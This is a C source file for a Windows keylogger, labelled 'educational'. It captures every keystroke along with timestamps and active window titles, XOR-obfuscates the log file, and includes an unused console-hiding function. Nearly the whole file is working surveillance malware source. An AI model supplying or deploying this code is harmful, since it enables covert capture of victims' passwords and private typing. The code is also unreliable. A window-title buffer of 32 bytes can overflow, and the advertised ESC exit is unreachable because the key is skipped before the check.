// Advanced Keylogger in C (Educational Purpose Only)
// Logs keystrokes with timestamps and window titles
// Encrypts logs using simple XOR encryption

#include <stdio.h>
#include <windows.h>
#include <time.h>

#define LOG_FILE "log.txt"
#define XOR_KEY 'K'

// Function to hide the console window
void hideConsole() {
    HWND hWnd = GetConsoleWindow();
    ShowWindow(hWnd, SW_HIDE);
}

// Function to get the active window title
void getActiveWindowTitle(char *title, int size) {
    HWND hwnd = GetForegroundWindow();
    GetWindowTextA(hwnd, title, size);
}

// Function to get current time as a string
void getTimeString(char *buffer, int size) {
    time_t now = time(0);
    struct tm *lt = localtime(&now);
    strftime(buffer, size, "%Y-%m-%d %H:%M:%S", lt);
}

// XOR Encryption
void xorEncrypt(char *text) {
    while (*text) {
        *text ^= XOR_KEY;
        text++;
    }
}

int main() {
    FILE *file;
    char keyBuffer[32], windowTitle[256], timestamp[64];
    int key;
    char lastWindow[256] = "";

   printf("Keylogger started. Press ESC to exit.\\n");

    file = fopen(LOG_FILE, "a+");
    if (!file) {
        return 1;
    }

    while (1) {
        Sleep(10); // Reduce CPU usage

        for (key = 8; key <= 255; key++) {
            if (GetAsyncKeyState(key) == -32767) {
                getActiveWindowTitle(windowTitle, sizeof(windowTitle));

                if (strcmp(windowTitle, lastWindow) != 0) {
                    getTimeString(timestamp, sizeof(timestamp));
                    sprintf(keyBuffer, "\n[%s] - Active Window: %s\n", timestamp, windowTitle);
                    xorEncrypt(keyBuffer);
                    fprintf(file, "%s", keyBuffer);
                    fflush(file);
                    strcpy(lastWindow, windowTitle);
                }

                // Handle special keys
                char logChar[32];
                getTimeString(timestamp, sizeof(timestamp));

                if (key == VK_RETURN)
                    sprintf(logChar, "[%s] -> [ENTER]\n", timestamp);
                else if (key == VK_BACK)
                    sprintf(logChar, "[%s] -> [BACKSPACE]\n", timestamp);
                else if (key == VK_SPACE)
                    sprintf(logChar, "[%s] -> [SPACE]\n", timestamp);
                else if ((key >= 32 && key <= 126))
                    sprintf(logChar, "[%s] -> %c\n", timestamp, key);
                else
                    continue;

                xorEncrypt(logChar);
                fprintf(file, "%s", logChar);
                fflush(file);

                if (key == VK_ESCAPE) {
                    fclose(file);
                    return 0;
                }
            }
        }
    }

    fclose(file);
    return 0;
}
